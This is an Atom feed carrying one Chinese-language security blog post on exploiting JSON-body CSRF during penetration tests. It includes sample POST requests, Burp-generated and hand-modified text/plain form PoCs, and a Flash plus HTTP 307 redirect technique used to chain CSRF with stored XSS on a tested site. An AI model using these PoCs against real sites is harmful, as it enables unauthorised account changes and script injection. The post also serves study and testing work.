<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CL0ud1&#39;s SecBlog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://cl0ud.site/"/>
  <updated>2019-04-13T09:34:56.435Z</updated>
  <id>http://cl0ud.site/</id>
  
  <author>
    <name>CL0ud1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://cl0ud.site/2019/04/13/%E5%85%B3%E4%BA%8EJSON%20CSRF%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <id>http://cl0ud.site/2019/04/13/关于JSON CSRF利用思路总结/</id>
    <published>2019-04-13T09:33:04.765Z</published>
    <updated>2019-04-13T09:34:56.435Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于JSON-CSRF利用思路总结"><a href="#关于JSON-CSRF利用思路总结" class="headerlink" title="关于JSON CSRF利用思路总结"></a>关于JSON CSRF利用思路总结</h1><p>在平时我们做渗透测试中，我们经常会遇到一些通过post提交json数组的CSRF漏洞，本文总结下关于JSON写入型CSRF的利用思路总结：</p><h3 id="攻击失败原因："><a href="#攻击失败原因：" class="headerlink" title="攻击失败原因："></a>攻击失败原因：</h3><p>很多小伙伴遇到这种类型的CSRF通常会通过Burp的Genrate CSRF POC去生成相对应的CSRF_POC进行攻击。</p><p>例如，原始数据包如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 371</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:](  https://www.mzxh.xyz) </span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;CL0ud1&quot;,&quot;age&quot;:&quot;18&quot;,&apos;password&apos;:&quot;123456&quot;&#125;</span><br></pre></td></tr></table></figure><p>我们通过Burp的Genrate CSRF 一键生成CSRF_POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure><p><form action="https://xxx.com" method="POST" enctype="text/plain"><br>  <input type="hidden" name="&#123;&quot;username&quot;&#58;&quot;CL0ud1&quot;&#44;&quot;age&quot;&#58;&quot;18&quot;&#44;&apos;password&apos;&#58;&quot;123456&quot;&#125;" value><br>  <input type="submit" value="Submit request"><br></form><br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>我们会发现一个问题，自动生产的CSRF_POC在请求时候会在末尾多一个“=”：</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552834244279.png" alt="1552834244279"></p><p>服务端的json解析器是无法成功识别不规范的JSON数据形式，导致我们的CSRF攻击失败。</p><p>我们进行多一对的key value赋值去消失”=”。前提是我们先通过Burp去重放存在CSRF的漏洞接口判断是否识别多余的key value，若是可以识别，可利用如下poc进行CSRF攻击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;form action=&quot;http://example.com/admin&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;   &lt;input name=&apos;&#123;&quot;username&quot;:&quot;CL0ud1&quot;,&quot;age&quot;:&quot;18&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;test&quot;:&quot;&apos; value=&apos;test&quot;&#125;&apos;type=&apos;hidden&apos;&gt;   &lt;input type=submit&gt;   </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>请求数据体如下：</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552835501147.png" alt="1552835501147"></p><p>但是，有时候通过此方法还是不能造成攻击。其实不难发现，这里是校验了Content-Type: application/json，而使用form只能设置为Content-Type: text/plain从而导致攻击失败。</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552836705861.png" alt="1552836705861"></p><h3 id="突破ctpye校验攻击："><a href="#突破ctpye校验攻击：" class="headerlink" title="突破ctpye校验攻击："></a>突破ctpye校验攻击：</h3><p>那么对于这种校验Content-Type: application/json的情况，且再第一个POC失效的情况下，我们如何去突破呢？</p><p>重点来了！使用flash劫持+307重定向实现CSRF攻击：</p><p>首先我们先认识下http307重定向，使用http307重定向的好处是可以保证重定向后保留了我们的请求方法和请求体都不会发生变化。</p><p>攻击思路如下：</p><p>1、HTTP POST请求。</p><p>2、从攻击者服务器发起307跳转，跳转到vuln.com，注意307跳转会带着http请求方式，header和postdata进行跳转。</p><p>3、vuln.com收到一条POST请求，并且Content-Type为application/json。</p><p>4、vuln.com收到一条/crossdomain.xml请求。由于第三步优先第四步执行，导致跨域。</p><h3 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h3><p>这里通过我一次实际众测案例进行具体分析：</p><p>某站用户后台添加用户姓名处存在存储型XSS漏洞：</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552878937644.png" alt="1552878937644"></p><p>从POST数据包我们可以分析得出，该漏洞接口并未设置CSRF防护措施，但是通过提交json数组来更改用户信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /user HTTP/1.1</span><br><span class="line">Host: CL0ud1.com</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 363</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: xxxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;avatar&quot;:&quot;&quot;,&quot;come_from&quot;:&quot;&quot;,&quot;company_id&quot;:&quot;&quot;,&quot;department&quot;:&quot;&quot;,&quot;description&quot;:&quot;&quot;,&quot;email&quot;:&quot;&quot;,&quot;end_time&quot;:1553058600,&quot;gender&quot;:0,&quot;id&quot;:0,&quot;interviewee&quot;:&quot;&quot;,&quot;name&quot;:&quot;xsstest&quot;,&quot;password_reseted&quot;:false,&quot;phone&quot;:&quot;&quot;,&quot;photos&quot;:[],&quot;purpose&quot;:&quot;0&quot;,&quot;start_time&quot;:1552881600,&quot;subject_type&quot;:1,&quot;visitor_type&quot;:1,&quot;title&quot;:&quot;&quot;,&quot;photo_ids&quot;:[],&quot;job_number&quot;:0,&quot;remark&quot;:&quot;&quot;,&quot;entry_date&quot;:0,&quot;birthday&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>我们通过修改Content-Type: text/plain 响应包报错如下所示：</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1552879505722.png" alt="1552879505722"></p><p>综上所述，我们对于校验了Content-Type的json_csrf需要通过flash+307跨域劫持进行攻击：</p><p>这里我们使用<a href="http://cm2.pw/crossdomain在线平台进行测试：" target="_blank" rel="noopener">http://cm2.pw/crossdomain在线平台进行测试：</a></p><p>1、首先在攻击平台上，定义好Content-Type: application/json;charset=UTF-8</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147553384.png" alt="1555147553384"></p><p>2、在request Date填写我们Post请求的数据包：</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147611313.png" alt="1555147611313"></p><p>3、然后通过cm2进行flash+307跨域请求去进行json_csrf攻击：</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147923173.png" alt="1555147923173"></p><p>4、成功触发CSRF+存储型XSS攻击：</p><p><img src="C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\1555147957834.png" alt="1555147957834"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;关于JSON-CSRF利用思路总结&quot;&gt;&lt;a href=&quot;#关于JSON-CSRF利用思路总结&quot; class=&quot;headerlink&quot; title=&quot;关于JSON CSRF利用思路总结&quot;&gt;&lt;/a&gt;关于JSON CSRF利用思路总结&lt;/h1&gt;&lt;p&gt;在平时我们做渗透测试
      
    
    </summary>
    
    
  </entry>
  
</feed>
